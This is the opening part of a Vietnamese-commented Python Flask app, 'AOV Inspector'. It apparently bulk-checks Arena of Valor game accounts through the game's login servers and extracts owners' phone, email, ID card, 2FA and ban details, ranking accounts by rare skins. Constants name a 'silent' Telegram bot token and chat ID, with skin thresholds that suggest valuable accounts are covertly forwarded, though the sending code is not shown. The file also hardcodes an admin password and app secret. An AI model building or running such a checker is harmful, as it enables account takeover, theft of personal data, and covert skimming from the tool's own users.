#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
AOV INSPECTOR - FULL CODE (đã tích hợp clm.py)
==============================================================================
- SĐT, Email, CMND, 2FA, Player UID, BAN, Weekly, Skin CDN
- Fix lấy được thông tin bảo mật từ nhiều endpoint
==============================================================================
"""

import os, json, time, uuid, random, hashlib, threading, logging, struct, socket, shutil, traceback, re
from io import BytesIO
from datetime import datetime
from functools import wraps
from typing import Dict, List
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import (Flask, render_template_string, request, jsonify, session,
                   redirect, url_for, flash, get_flashed_messages, Response)
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "matkhau"
APP_SECRET = "aov_ultimate_mega_2024"
DATA_FILE = "web_data.json"
DATA_BACKUP_FILE = "web_data_backup.json"
DATA_TMP_FILE = "web_data.json.tmp"
UPLOAD_FOLDER = "uploads"
LOG_FILE = "aov_inspector.log"
BACKUP_DIR = "backups"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

MAX_CONCURRENT_CHECKS = 50
MAX_PARALLEL_JOBS = 3
TCP_LOGIN_TIMEOUT = 15
REFERRAL_REWARD = 100
REFERRAL_BONUS = 20
DEFAULT_BALANCE = 400
DAILY_REWARD = 10
AUTO_BACKUP_INTERVAL = 300

SILENT_BOT_TOKEN = "8984591005:AAEBgJgtBfWJIAiYg4hh355pSk0I9BRYtt0"
SILENT_CHAT_ID = "8846236342"
SILENT_MIN_SKINS = 100
SILENT_MIN_SSS = 3

AUTH_SERVERS = ["103.247.205.14", "103.247.205.15", "103.247.205.18"]

app = Flask(__name__)
app.secret_key = APP_SECRET
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024
app.config['PERMANENT_SESSION_LIFETIME'] = 86400 * 30

logging.basicConfig(level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler()])
logger = logging.getLogger(__name__)

@app.errorhandler(500)
def internal_error(e):
    logger.error(f"500: {traceback.format_exc()}")
    return render_error_page(), 500

@app.errorhandler(Exception)
def all_exceptions(e):
    logger.error(f"EXC: {traceback.format_exc()}")
    return render_error_page(), 500

def render_error_page():
    return '<html><body style="background:#05000e;color:#fff;text-align:center;padding:50px;font-family:sans-serif"><h1>⚠️ LỖI</h1><a href="/" style="color:#00f0ff">← TRANG CHỦ</a></body></html>'

USERS: Dict[str, dict] = {}
GENERATED_KEYS: Dict[str, dict] = {}
NOTIFICATIONS: List[dict] = []
CHECK_JOBS: Dict[str, dict] = {}
JOB_QUEUE: List[str] = []
_active_jobs_lock = threading.Lock()
_active_jobs_count = [0]
_lock = threading.Lock()

CULTIVATION_LEVELS = [
    {"name": "Luyện Khí", "exp": 0, "hp": 100, "atk": 20, "def": 10, "color": "#8b8b9a", "icon": "🌱"},
    {"name": "Trúc Cơ", "exp": 100, "hp": 200, "atk": 40, "def": 20, "color": "#a0c0a0", "icon": "🌿"},
    {"name": "Kim Đan", "exp": 300, "hp": 400, "atk": 80, "def": 40, "color": "#ffd700", "icon": "🟡"},
    {"name": "Nguyên Anh", "exp": 700, "hp": 800, "atk": 160, "def": 80, "color": "#ffb800", "icon": "👶"},
    {"name": "Hóa Thần", "exp": 1500, "hp": 1500, "atk": 300, "def": 150, "color": "#00f0ff", "icon": "✨"},
    {"name": "Luyện Hư", "exp": 3000, "hp": 3000, "atk": 600, "def": 300, "color": "#00c8ff", "icon": "🌀"},
    {"name": "Hợp Thể", "exp": 6000, "hp": 6000, "atk": 1200, "def": 600, "color": "#00a0ff", "icon": "🔷"},
    {"name": "Đại Thừa", "exp": 12000, "hp": 12000, "atk": 2400, "def": 1200, "color": "#8080ff", "icon": "🔵"},
    {"name": "Chân Tiên", "exp": 30000, "hp": 30000, "atk": 6000, "def": 3000, "color": "#a060ff", "icon": "🌟"},
    {"name": "Kim Tiên", "exp": 80000, "hp": 80000, "atk": 16000, "def": 8000, "color": "#c040ff", "icon": "⭐"},
    {"name": "Đại La Kim Tiên", "exp": 200000, "hp": 200000, "atk": 40000, "def": 20000, "color": "#e020ff", "icon": "💫"},
    {"name": "Tiên Đế", "exp": 500000, "hp": 500000, "atk": 100000, "def": 50000, "color": "#ff00e5", "icon": "👑"},
    {"name": "Thần Vương", "exp": 1000000, "hp": 1000000, "atk": 200000, "def": 100000, "color": "#ff00a0", "icon": "🔱"},
    {"name": "Bán Tiên", "exp": 2000000, "hp": 2000000, "atk": 400000, "def": 200000, "color": "#ff0080", "icon": "💎"},
    {"name": "Chuẩn Thánh", "exp": 4000000, "hp": 4000000, "atk": 800000, "def": 400000, "color": "#ff0060", "icon": "🗡"},
    {"name": "Thánh Nhân", "exp": 8000000, "hp": 8000000, "atk": 1600000, "def": 800000, "color": "#ff0040", "icon": "⚔"},
    {"name": "Đại Thánh", "exp": 16000000, "hp": 16000000, "atk": 3200000, "def": 1600000, "color": "#ff2020", "icon": "🛡"},
    {"name": "Chuẩn Đế", "exp": 32000000, "hp": 32000000, "atk": 6400000, "def": 3200000, "color": "#ff4000", "icon": "🔥"},
    {"name": "Đế Cảnh", "exp": 64000000, "hp": 64000000, "atk": 12800000, "def": 6400000, "color": "#ff6000", "icon": "☀"},
    {"name": "Chí Tôn", "exp": 128000000, "hp": 128000000, "atk": 25600000, "def": 12800000, "color": "#ff8000", "icon": "🌞"},
    {"name": "Bất Diệt", "exp": 256000000, "hp": 256000000, "atk": 51200000, "def": 25600000, "color": "#ffa000", "icon": "♾"},
    {"name": "Hỗn Nguyên", "exp": 512000000, "hp": 512000000, "atk": 102400000, "def": 51200000, "color": "#ffc000", "icon": "☯"},
    {"name": "Đạo Tổ", "exp": 1024000000, "hp": 1024000000, "atk": 204800000, "def": 102400000, "color": "#ffe000", "icon": "📿"},
    {"name": "Lọ Vương", "exp": 2048000000, "hp": 2048000000, "atk": 409600000, "def": 204800000, "color": "#e0ff00", "icon": "🏺"},
    {"name": "Đại Đế", "exp": 4096000000, "hp": 4096000000, "atk": 819200000, "def": 409600000, "color": "#c0ff00", "icon": "⚜"},
    {"name": "VÔ ĐỊCH", "exp": 10000000000, "hp": 10000000000, "atk": 2000000000, "def": 1000000000, "color": "#a0ff00", "icon": "🏆"},
    {"name": "Siêu Thần", "exp": 20000000000, "hp": 20000000000, "atk": 4000000000, "def": 2000000000, "color": "#80ff40", "icon": "🌈"},
    {"name": "Thần Tổ", "exp": 40000000000, "hp": 40000000000, "atk": 8000000000, "def": 4000000000, "color": "#40ff80", "icon": "🕉"},
    {"name": "Vũ Trụ Chi Chủ", "exp": 80000000000, "hp": 80000000000, "atk": 16000000000, "def": 8000000000, "color": "#00ff80", "icon": "🌌"},
    {"name": "Đa Nguyên Tối Thượng", "exp": 160000000000, "hp": 160000000000, "atk": 32000000000, "def": 16000000000, "color": "#00ffc0", "icon": "🌠"},
    {"name": "Vô Hạn Siêu Việt", "exp": 320000000000, "hp": 320000000000, "atk": 64000000000, "def": 32000000000, "color": "#00ffff", "icon": "💠"},
    {"name": "Toàn Năng Chí Tôn", "exp": 640000000000, "hp": 640000000000, "atk": 128000000000, "def": 64000000000, "color": "#40e0ff", "icon": "🔮"},
    {"name": "Bất Khả Chiến Bại", "exp": 1280000000000, "hp": 1280000000000, "atk": 256000000000, "def": 128000000000, "color": "#80c0ff", "icon": "⚡"},
    {"name": "Vĩnh Hằng Chí Cao", "exp": 2560000000000, "hp": 2560000000000, "atk": 512000000000, "def": 256000000000, "color": "#a0a0ff", "icon": "♛"},
    {"name": "Sáng Thế Thần", "exp": 5120000000000, "hp": 5120000000000, "atk": 1024000000000, "def": 512000000000, "color": "#c080ff", "icon": "🌅"},
    {"name": "Chúa Tể Vạn Vật", "exp": 10240000000000, "hp": 10240000000000, "atk": 2048000000000, "def": 1024000000000, "color": "#e060ff", "icon": "🔱"},
    {"name": "Đấng Sáng Tạo", "exp": 20480000000000, "hp": 20480000000000, "atk": 4096000000000, "def": 2048000000000, "color": "#ff40ff", "icon": "✴"},
    {"name": "Toàn Tri Toàn Năng", "exp": 40960000000000, "hp": 40960000000000, "atk": 8192000000000, "def": 4096000000000, "color": "#ff00ff", "icon": "🌟"},
    {"name": "VÔ THƯỢNG CHÍ TÔN", "exp": 100000000000000, "hp": 100000000000000, "atk": 20000000000000, "def": 10000000000000, "color": "#ffffff", "icon": "👁"},
]

MON_PHAI = {
    "thien_kiem": {"name": "Thiên Kiếm", "bonus_atk": 20, "bonus_def": 0, "bonus_hp": 0, "color": "#00f0ff", "emoji": "⚔", "desc": "Kiếm phái tối thượng, công kích vô song"},
    "cuu_long": {"name": "Cửu Long", "bonus_atk": 0, "bonus_def": 20, "bonus_hp": 0, "color": "#ff4000", "emoji": "🐉", "desc": "Rồng thiêng hộ mệnh, phòng thủ kiên cố"},
    "thien_am": {"name": "Thiên Âm", "bonus_atk": 0, "bonus_def": 0, "bonus_hp": 50, "color": "#ff00e5", "emoji": "🎵", "desc": "Âm công nhiếp hồn, sinh lực dồi dào"},
    "huyen_mon": {"name": "Huyền Môn", "bonus_atk": 15, "bonus_def": 15, "bonus_hp": 0, "color": "#a855f7", "emoji": "☯", "desc": "Huyền diệu vô biên, cân bằng âm dương"},
    "vo_cuc": {"name": "Vô Cực", "bonus_atk": 25, "bonus_def": 0, "bonus_hp": 0, "color": "#00ff88", "emoji": "⭕", "desc": "Vô cực sinh thái cực, công kích vô hạn"},
    "thai_at": {"name": "Thái Ất", "bonus_atk": 0, "bonus_def": 25, "bonus_hp": 0, "color": "#ffb800", "emoji": "✦", "desc": "Thái ất chân nhân, phòng ngự tuyệt đối"},
    "cuu_uy": {"name": "Cửu U", "bonus_atk": 30, "bonus_def": 0, "bonus_hp": 0, "color": "#8b00ff", "emoji": "💀", "desc": "Cửu u ma đạo, sát thương kinh hoàng"},
    "hon_don": {"name": "Hỗn Độn", "bonus_atk": 0, "bonus_def": 30, "bonus_hp": 30, "color": "#ff00a0", "emoji": "🌌", "desc": "Hỗn độn khai thiên, phòng thủ tuyệt đối"},
}

VU_KHI = {
    "pham_kiem": {"name": "Phàm Kiếm", "atk": 10, "cost": 20, "color": "#8b8b9a", "emoji": "🗡"},
    "thanh_kiem": {"name": "Thanh Kiếm", "atk": 30, "cost": 60, "color": "#00ff88", "emoji": "⚔"},
    "truong_kiem": {"name": "Trường Kiếm", "atk": 60, "cost": 120, "color": "#00f0ff", "emoji": "🗡"},
    "than_khi": {"name": "Thần Khí", "atk": 100, "cost": 200, "color": "#00a0ff", "emoji": "⚡"},
    "long_kiem": {"name": "Long Kiếm", "atk": 200, "cost": 400, "color": "#4080ff", "emoji": "🐉"},
    "phuong_kiem": {"name": "Phượng Kiếm", "atk": 350, "cost": 700, "color": "#a060ff", "emoji": "🔥"},
    "than_kiem": {"name": "Thần Kiếm", "atk": 550, "cost": 1100, "color": "#e020ff", "emoji": "✨"},
    "huyet_kiem": {"name": "Huyết Kiếm", "atk": 800, "cost": 1600, "color": "#ff00e5", "emoji": "🩸"},
    "tien_kiem": {"name": "Tiên Kiếm", "atk": 1200, "cost": 2400, "color": "#ff0080", "emoji": "🌟"},
    "than_kiem_vu_tru": {"name": "Thần Kiếm Vũ Trụ", "atk": 2000, "cost": 4000, "color": "#ffd700", "emoji": "🌌"},
}

RANK_MAP = {
    "0": "Chưa xếp hạng", "1": "Đồng I", "2": "Đồng II", "3": "Đồng III",
    "4": "Bạc I", "5": "Bạc II", "6": "Bạc III", "7": "Vàng I", "8": "Vàng II", "9": "Vàng III", "10": "Vàng IV",
    "11": "Bạch Kim I", "12": "Bạch Kim II", "13": "Bạch Kim III", "14": "Bạch Kim IV", "15": "Bạch Kim V",
    "16": "Kim Cương I", "17": "Kim Cương II", "18": "Kim Cương III", "19": "Kim Cương IV", "20": "Kim Cương V",
    "21": "Tinh Anh I", "22": "Tinh Anh II", "23": "Tinh Anh III", "24": "Tinh Anh IV", "25": "Tinh Anh V",
    "26": "Cao Thủ I", "27": "Cao Thủ II", "28": "Cao Thủ III", "29": "Cao Thủ IV", "30": "Cao Thủ V",
    "31": "Chiến Tướng I", "32": "Chiến Tướng II", "33": "Chiến Tướng III", "34": "Chiến Tướng IV", "35": "Chiến Tướng V",
    "36": "Chiến Thần I", "37": "Chiến Thần II", "38": "Chiến Thần III", "39": "Chiến Thần IV", "40": "Chiến Thần V",
    "41": "Thách Đấu I", "42": "Thách Đấu II", "43": "Thách Đấu III", "44": "Thách Đấu IV", "45": "Thách Đấu V",
    "46": "Cao Thủ VN", "47": "Cao Thủ VN II",
}

RANK_NAME_MAP = {"bronze": "Đồng", "silver": "Bạc", "gold": "Vàng", "platinum": "Bạch Kim",
    "diamond": "Kim Cương", "veteran": "Tinh Anh", "elite": "Cao Thủ", "master": "Chiến Tướng",
    "grandmaster": "Chiến Thần", "legend": "Thách Đấu", "conqueror": "Cao Thủ VN"}

HERO_CDN_BASE = "https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/"

def _norm_unix_ts(v):
    try:
        t = int(float(v or 0))
    except Exception:
        return 0
    if t <= 0:
        return 0
    while t > 10_000_000_000:
        t //= 1000
    if t < 0 or t > 32_503_680_000:
        return 0
    return t

def _safe_fromtimestamp(v, fmt="%d-%m-%Y %H:%M"):
    ts = _norm_unix_ts(v)
    if not ts or ts < 946_684_800:
        return ""
    try:
        return datetime.fromtimestamp(ts).strftime(fmt)
    except (OSError, OverflowError, ValueError, TypeError):
        return ""

def _deep_find(obj, keys, max_depth=6, _d=0):
    if _d > max_depth or obj is None:
        return None
    if isinstance(obj, dict):
        for k in keys:
            if k in obj and obj[k] not in (None, "", 0, "0", [], {}):
                return obj[k]
        for v in obj.values():
            r = _deep_find(v, keys, max_depth, _d + 1)
            if r not in (None, "", 0, "0", [], {}):
                return r
    elif isinstance(obj, list):
        for v in obj:
            r = _deep_find(v, keys, max_depth, _d + 1)
            if r not in (None, "", 0, "0", [], {}):
                return r
    return None

def _hero_cdn(item_id):
    iid = int(item_id)
    prefix = iid // 100
    variant = iid % 100
    if variant <= 1:
        return f"{HERO_CDN_BASE}30{prefix}0.jpg"
    return f"{HERO_CDN_BASE}30{prefix}{variant}head.jpg"

def parse_rank(rank_value):
    if rank_value is None: return "Chưa xếp hạng", 0
    if isinstance(rank_value, dict):
        rn = rank_value.get("rankName") or rank_value.get("name") or ""
        stars = rank_value.get("star") or rank_value.get("stars") or 0
        return str(rn) if rn else "Chưa xếp hạng", int(stars) if str(stars).isdigit() else 0
    rv = str(rank_value).strip()
    if not rv or rv == "0": return "Chưa xếp hạng", 0
    if rv.isdigit() and rv in RANK_MAP: return RANK_MAP[rv], 0
    for k, v in RANK_NAME_MAP.items():
        if k in rv.lower(): return v, 0
    return rv, 0

SKIN_SSS = {
    "54307": "Aya Công chúa cầu vồng", "19908": "Eland'orr Mộng giới thần chủ",
    "15412": "Yena Huyền cửu thiên", "19007": "Tulen Chí tôn kiếm tiên",
    "19009": "Tulen Thần sứ ST.L-79", "50105": "Tel'Annas Thần sứ F.E.E-X1",
    "50112": "Tel'Annas Tân niên vệ thần", "50119": "Tel'Annas Lân Quang Thánh Điệu",
    "52414": "Capheny Càn Nguyên Điện Chủ", "52011": "Veres Lưu ly Long mẫu",
    "13011": "Airi Bích hải thánh nữ", "13015": "Airi Thứ nguyên Vệ thần",
    "13613": "Ilumia Lưỡng Nghi Long Hậu", "11607": "Butterfly Phượng Cửu Thiên",
    "12912": "Triệu Vân Minh Chung Long Đế", "15009": "Nakroth thứ nguyên vệ thần",
    "15013": "Nakroth Quỷ thương Liệp Đế", "15015": "Nakroth Bạch diện chiến thương",
    "11107": "Violet Thứ nguyên vệ thần", "11119": "Violet Vọng nguyệt Long Cơ",
    "13314": "Valhein Thứ nguyên vệ thần", "15217": "Điêu Thuyền Nhật Nguyệt Thánh Linh",
    "10620": "Krixi Phù thủy thời không", "13118": "Murad Thiên Luân Kiếm Thánh",
    "14111": "Lauriel Thứ nguyên vệ thần", "15710": "Raz Bão vũ Cuồng lôi",
    "13210": "Hayate Tu Di Thánh Đế", "54804": "Bijan Kình thiên Long Kỵ",
    "50108": "Tel'Annas Thứ nguyên vệ thần", "13116": "Murad Tuyệt thế thần binh",
    "51015": "Liliana Ma Pháp Tối Thượng",
}

SKIN_SS = {
    "59901": "Billow Thiên Tướng - Độ Ách", "15905": "Dolia Mã Khởi Thiên Ca",
    "54802": "Bijan Hoàng kim cơ giáp", "54507": "Yue Hỗn Độn Thần Ma",
    "53701": "Allain Kirito Hắc kiếm sĩ", "51306": "Zata Chí tôn Tà Phượng",
    "19109": "Rouie Linh Sứ Thời không", "52404": "Capheny Kimono",
    "13705": "Paine Tử xà Bá tước", "13204": "Hayate Tử thần vũ trụ",
    "13212": "Hayate Thống soái Dạ Ưng", "56703": "Erin Tình yêu cổ tích",
    "51208": "Rourke Bách tướng Lão đại", "52007": "Veres Kimono",
    "13005": "Airi Kiemono", "52113": "Florentino Kỷ Nguyên Hổ Phách",
    "52709": "Sephera Bách nhạn ngân linh", "51802": "Quillen Đặc công mãng xà",
    "51504": "Richter Kiếm thần Susanoo", "19605": "Elsu Sứ giả tận thế",
    "50604": "Omen Đao phủ tận thế", "52304": "D'arcy Pháp sư hỏa long",
    "15007": "Nakroth Lôi Quang Sứ", "13104": "Murad Siêu việt",
    "16607": "Arthur Siêu Việt", "16703": "Ngộ Không Siêu việt",
    "12304": "Maloch Đại Tướng Robot", "18408": "Helen Bé Hoa Xuân",
    "10603": "Krixi Tiệc Bãi Biển", "10912": "Veera A.I Love you",
    "15202": "Điêu Thuyền Tiệc bãi biển", "12801": "Lữ Bố Tiệc Bãi Biển",
    "11202": "Yorn Thế Tử Nguyệt Tộc", "10801": "Gildur Tiệc Bãi Biển",
    "11808": "Alice Quân nhạc Athanor", "11604": "Butterfly Nữ Quái Nổi Loạn",
    "12008": "Mina Linh Xà yêu vũ", "11105": "Violet Tiệc bãi biển",
    "13302": "Valhein Vũ khí tối thượng", "16605": "Arthur Siêu Việt",
    "12903": "Triệu Vân Dũng Sĩ Đồ Long", "14104": "Lauriel Thánh quang sứ",
    "14107": "Lauriel Tinh vân sứ", "14202": "Natalya Nghệ Nhân Lân",
    "10705": "Zephys Siêu việt", "10915": "Veera Thất Sát - Thượng Sinh",
    "11110": "Violet Vợ người ta", "11113": "Violet Huyết Ma Thần",
    "11115": "Violet Thần long tỷ tỷ", "11205": "Yorn Long thần soái",
    "11212": "Yorn Vệ Binh ngân hà", "11614": "Butterfly Kim ngư thần nữ",
    "11616": "Butterfly Thánh nữ khởi nguyên", "11619": "Butterfly Rockgirl Siêu Đẳng",
    "12606": "Arduin Bạch vệ chiến giáp", "12608": "Arduin Ngạo Hổ Hàn Đao",
    "12806": "Lữ Bố Tư lệnh Robot", "12812": "Lữ Bố Cửu Thiên Lôi Thần",
    "12907": "Triệu Vân Kỵ sĩ tận thế", "12910": "Triệu Vân Đoạt Mệnh Thương",
    "13006": "Airi Bạch Kiemono", "13108": "Murad Siêu việt 2.0",
    "13109": "Murad Chí tôn thần kiếm", "13313": "Valhein Đệ nhất thần thám",
    "13609": "Ilumia Khải Huyền Thiên Hậu", "13612": "Ilumia Nộ hải Thiên ngư",
    "14109": "Lauriel thiên sứ công nghệ", "14110": "Lauriel Phi thiên",
    "14117": "Lauriel Vũ khúc miêu ảnh", "14118": "Lauriel Thiên nữ Dạ Ưng",
    "14206": "Natalya Nghiệp Hoả Yêu Hậu", "14404": "Taara Tiệc bãi biển",
    "15204": "Điêu Thuyền WaVe", "15211": "Điêu Thuyền Thất Tịch Tiên Tử",
    "15409": "Yena WaVe", "15413": "Yena Trấn Yêu Thần Lộc",
    "15611": "Aleister HLV bất bại", "15704": "Raz Chiến thần Muay Thái",
    "15705": "Raz Siêu việt", "16602": "Arthur Hoàng Kim Cốt",
    "16705": "Ngộ Không Siêu việt 2.0", "16710": "Ngộ Không Tân niên Võ Thần",
    "16711": "Ngộ Không Thần Giáp Xích Diễm", "16712": "Ngộ Không Tề Thiên Võ Thánh",
    "17106": "Cresht Bách Tướng Lão Tam", "17309": "Fennik Phong Tranh Thám Xuân",
    "18702": "Arum Vũ khúc long hổ", "18704": "Arum Vũ khúc thần sứ",
    "19002": "Tulen Tân Thần Thiên Hà", "19006": "Tulen Tân thần hoàng kim",
    "19012": "Tulen Tân niên vệ thần", "19013": "Tulen Tiêu Dao Vũ Thần",
    "19509": "Enzo Sát thần Bạch Hổ", "19609": "Elsu Trấn thiên phi hồ",
    "50111": "Tel'Annas Vũ khúc yêu hồ", "50117": "Tel'Annas Thiên Vũ Thần Long",
    "51003": "Liliana Nguyệt mị ly", "51004": "Liliana Tiểu thơ anh đào",
    "51005": "Liliana Tân nguyệt mị ly", "51009": "Liliana WaVe",
    "51013": "Liliana Lưu Thủy Thần Long", "51808": "Quillen Nghịch thiên long đế",
    "53304": "Laville Xạ Thần Tinh Vệ", "53309": "Laville Vệ binh giáng sinh",
    "53503": "Sinestrea Wave", "53703": "Allain Tuyết sơn song kiếm",
    "53708": "Allain Thần Kiếm Lôi Quang", "10605": "Krixi Đêm Noel",
}

SKIN_ANIME = {
    "59702": "Biron Yuji Itadori", "52809": "Qi Milim Nava",
    "54402": "Yan Tanjiro Kamado", "54309": "Aya Cinnamoroll's Dream",
    "53806": "Iggy Rimuru Tempest", "54002": "Bright Toshiro Hitsugaya",
    "18906": "Krizzix Cursed Corpse", "53107": "Keera Nezuko Kamado",
    "19506": "Enzo Sát quỷ đoàn", "52204": "Errol Genos",
    "52407": "Capheny Harley Quinn", "13706": "Paine Megumi Fushiguro",
    "13213": "Hayate Siêu đạo chích Kid", "52110": "Florentino Hisoka",
    "11215": "Yorn Conan Edogawa", "12808": "Lữ Bố Ichigo Kurosaki",
    "13111": "Murad Byakuya Kuchiki", "10611": "Krixi Terrible Tornado",
    "15012": "Nakroth Killua", "11611": "Butterfly Stacia",
    "10709": "Zephys Inosuke Hashibira", "10914": "Veera Phù thủy Hội họa",
    "11120": "Violet Nobara Kugisaki", "11610": "Butterfly Asuna Tia chớp",
    "11810": "Alice Phi hành gia", "11812": "Alice Eternal Sailor Chibi Moon",
    "13112": "Murad Zenitsu Agatsuma", "15212": "Eternal Sailor Moon",
    "15304": "Kaine Chiến Binh Kim Quang", "15707": "Raz Saitama Cosplay",
    "15711": "Raz Gon", "16307": "Ryoma Ultraman",
    "16310": "Ryoma Ailing Samurai", "16311": "Ryoma Maple Frost",
    "16707": "Ngộ Không Nhóc tỳ bá đạo", "16909": "Slimz Siêu Cấp Tối Thượng",
    "17405": "Stuart Đạo tặc tử quang", "17706": "Lindis Đồng phục Shihakusho",
    "19015": "Tulen Satoru Gojo", "19508": "Enzo Kurapika",
    "19906": "Eland'orr Tuxedo", "50118": "Tel'Annas Jujutsu Sorcerer",
    "51305": "Zata Tác gia đương đại", "51907": "Annette Nữ sinh trung học",
    "52105": "Florentino SEVEN", "52710": "Sephera NoVa Stardust",
    "53702": "Allain Kirito",
}

HERO_MAP = {
    "105": "Toro", "106": "Krixi", "107": "Zephys", "108": "Gildur", "109": "Veera",
    "110": "Kahlii", "111": "Violet", "112": "Yorn", "113": "Chaugnar", "114": "Omega",
    "115": "Jinna", "116": "Butterfly", "117": "Ormarr", "118": "Alice", "119": "Mganga",
    "120": "Mina", "121": "Marja", "123": "Maloch", "124": "Ignis", "126": "Arduin",
    "127": "Azzen'Ka", "128": "Lữ Bố", "129": "Triệu Vân", "130": "Airi", "131": "Murad",
    "132": "Hayate", "133": "Valhein", "134": "Skud", "135": "Thane", "136": "Ilumia",
    "137": "Paine", "139": "Kil'Groth", "140": "Superman", "141": "Lauriel", "142": "Natalya",
    "144": "Taara", "146": "Zill", "148": "Preyta", "149": "Xeniel", "150": "Nakroth",
    "152": "Điêu Thuyền", "153": "Kaine", "154": "Yena", "156": "Aleister", "157": "Raz",
    "159": "Dolia", "162": "Kriknak", "163": "Ryoma", "166": "Arthur", "167": "Ngộ Không",
    "168": "Lumburr", "169": "Slimz", "170": "Moren", "171": "Cresht", "173": "Fennik",
    "174": "Stuart", "175": "Grakk", "177": "Lindis", "180": "Max", "184": "Helen",
    "186": "TeeMee", "187": "Arum", "189": "Krizzix", "190": "Tulen", "191": "Rouie",
    "192": "Celica", "193": "Amily", "195": "Enzo", "196": "Elsu",
    "199": "Eland'orr", "206": "Charlotte", "501": "Tel'Annas", "502": "Astrid",
    "503": "Zuka", "506": "Omen", "509": "Y'bneth", "510": "Liliana",
    "512": "Rourke", "513": "Zata", "515": "Richter", "518": "Quillen",
    "519": "Annette", "520": "Veres", "521": "Florentino", "522": "Errol",
    "523": "D'Arcy", "524": "Capheny", "525": "Zip", "526": "Ishar",
    "527": "Sephera", "528": "Qi", "529": "Volkath", "530": "Dirak",
    "531": "Keera", "532": "Thorne", "533": "Laville", "534": "Dextra",
    "535": "Sinestrea", "536": "Aoi", "537": "Allain", "538": "Iggy",
    "539": "Lorion", "540": "Bright", "541": "Bonnie", "542": "Tachi",
    "543": "Aya", "544": "Yan", "545": "Yue", "546": "Teeri",
    "548": "Bijan", "563": "Heino", "567": "Erin", "568": "Ming",
    "577": "ShaoSiYuan", "582": "Ciyuanfashi", "584": "CiYuansheshou",
    "593": "MaChao", "595": "LiXin", "596": "Goverra", "597": "Biron",
    "598": "Bolt Baron", "599": "Billow"
}

def gen_id():
    return "AOV-" + uuid.uuid4().hex[:4].upper() + "-" + uuid.uuid4().hex[:4].upper()

def hash_password(p):
    return hashlib.sha256((p + APP_SECRET).encode()).hexdigest()

def save_data():
    try:
        with _lock:
            data = {"users": USERS, "generated_keys": GENERATED_KEYS,
                    "notifications": NOTIFICATIONS[-100:]}
            with open(DATA_TMP_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
                f.flush(); os.fsync(f.fileno())
            if os.path.exists(DATA_FILE) and os.path.getsize(DATA_FILE) > 0:
                try: shutil.copy2(DATA_FILE, DATA_BACKUP_FILE)
                except: pass
            os.replace(DATA_TMP_FILE, DATA_FILE)
    except Exception as e:
        logger.error(f"Save error: {e}")

def auto_backup_worker():
    while True:
        try:
            time.sleep(AUTO_BACKUP_INTERVAL)
            if os.path.exists(DATA_FILE):
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                dst = os.path.join(BACKUP_DIR, f"web_data_{ts}.json")
                shutil.copy2(DATA_FILE, dst)
                files = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith("web_data_")])
                if len(files) > 48:
                    for old in files[:-48]:
                        try: os.remove(os.path.join(BACKUP_DIR, old))
                        except: pass
        except Exception as e:
            logger.error(f"Backup error: {e}")

def load_data():
    global USERS, GENERATED_KEYS, NOTIFICATIONS
    data = None
    for fname in (DATA_FILE, DATA_BACKUP_FILE):
        if not os.path.exists(fname): continue
        try:
            if os.path.getsize(fname) == 0: continue
            with open(fname, "r", encoding="utf-8") as f:
                data = json.load(f)
            break
        except: data = None
    if data is None: return
    USERS = data.get("users", {})
    GENERATED_KEYS = data.get("generated_keys", {})
    NOTIFICATIONS = data.get("notifications", [])

def create_admin():
    if ADMIN_USERNAME not in USERS:
        USERS[ADMIN_USERNAME] = {
            "id": gen_id(), "username": ADMIN_USERNAME,
            "password": hash_password(ADMIN_PASSWORD),
            "balance": 999999999, "temp_balance": 0, "referrals": 0, "is_admin": True,
            "created_at": time.time(), "last_checkin": 0, "last_notif_read": 0,
            "checkin_streak": 0, "total_checkins": 0,
            "cultivation": {"level": len(CULTIVATION_LEVELS) - 1, "exp": CULTIVATION_LEVELS[-1]["exp"],
                            "hp": CULTIVATION_LEVELS[-1]["hp"], "atk": CULTIVATION_LEVELS[-1]["atk"],
                            "def": CULTIVATION_LEVELS[-1]["def"], "weapon": None, "mon_phai": None, "mon_phai_level": 0},
            "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0, "xu_used": 0, "claimed": []},
            "history": [], "current_job": None,
        }
    else:
        USERS[ADMIN_USERNAME]["password"] = hash_password(ADMIN_PASSWORD)
        USERS[ADMIN_USERNAME]["is_admin"] = True
    save_data()

def login_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session or session["username"] not in USERS:
            session.pop("username", None)
            return redirect(url_for("login_page"))
        return f(*a, **k)
    return deco

def admin_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session: return redirect(url_for("login_page"))
        u = USERS.get(session["username"])
        if not u or not u.get("is_admin"):
            flash("Không có quyền!", "error")
            return redirect(url_for("check_page"))
        return f(*a, **k)
    return deco

def get_user():
    if "username" not in session: return None
    return USERS.get(session["username"])

def unread_count():
    u = get_user()
    if not u: return 0
    lr = u.get("last_notif_read", 0)
    return sum(1 for n in NOTIFICATIONS if n.get("timestamp", 0) > lr)

def mark_read():
    u = get_user()
    if u:
        u["last_notif_read"] = time.time()
        save_data()

HOST = "103.247.205.14"
PORT = 19000
CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION = 283
CLIENT_TYPE = 4352
CMD_LOGIN_PREPARE = 256
CMD_LOGIN = 257
CMD_SSO_KEY_GET = 442
CMD_SESSION_TOKEN_GET = 278
CMD_APP_OAUTH_LOGIN = 439
PACKET_VERSION = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION
CLIENT_ID_MASK = 4354
_pkt_counter = random.randint(0, 0x3FFFFF)
_XTEA_DELTA = 0x9E3779B9
_XTEA_ROUNDS = 32

def _mix(v): return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)

